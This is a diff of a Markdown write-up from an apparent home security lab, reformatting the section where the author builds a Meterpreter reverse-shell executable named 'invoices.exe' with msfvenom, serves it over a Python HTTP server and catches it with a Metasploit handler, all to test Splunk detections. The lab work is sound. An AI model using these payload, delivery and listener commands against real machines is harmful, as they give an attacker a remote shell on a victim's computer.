@@ -18,10 +18,13 @@ This section documents how I created controlled malware-like payloads to generat
 ### MSFvenom Reverse Shell Payload
 My main payload was a Windows Meterpreter executable created with MSFvenom:
 
-``msfvenom -p windows/x64/meterpreter/reverse_tcp \
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
 LHOST=192.168.1.250 \
 LPORT=4444 \
--f exe -o invoices.exe``
+-f exe -o invoices.exe
+```
+
 
 ### Why this matters
 ✔ Behaves like a real-world malicious artifact
@@ -35,13 +38,15 @@ LPORT=4444 \
 ✔ Helps test Splunk detections (ATT&CK T1059, T1105, etc.)
 
 ### The generated payload is stored under:
-``payloads/invoices.exe``
-#
+```
+payloads/invoices.exe`
+```
 
 ## Hosting the Payload Over HTTP
 ### To deliver the payload to the Windows machine, I used a simple Python HTTP server:
-``python3 -m http.server 9999
-``
+```
+python3 -m http.server 9999
+```
 
 This simulates a common attacker delivery technique.
 
@@ -53,26 +58,33 @@ It also generates:
 
 The hosting scripts are located in:
 
-``scripts/start_http_server.sh``
+```
+scripts/start_http_server.sh
+```
 
 ## Metasploit Listener Setup
 
 I configured Metasploit to listen for the callback using a resource file:
 
-``use exploit/multi/handler
+```
+use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.250
 set LPORT 4444
 run
-``
+```
 
 Stored in the repo as:
 
-``scripts/msf_handler.rc``
+```
+scripts/msf_handler.rc
+```
 
 Start it with:
 
-``msfconsole -r scripts/msf_handler.rc``
+```
+msfconsole -r scripts/msf_handler.rc
+```
 
 Purpose of This Section
 
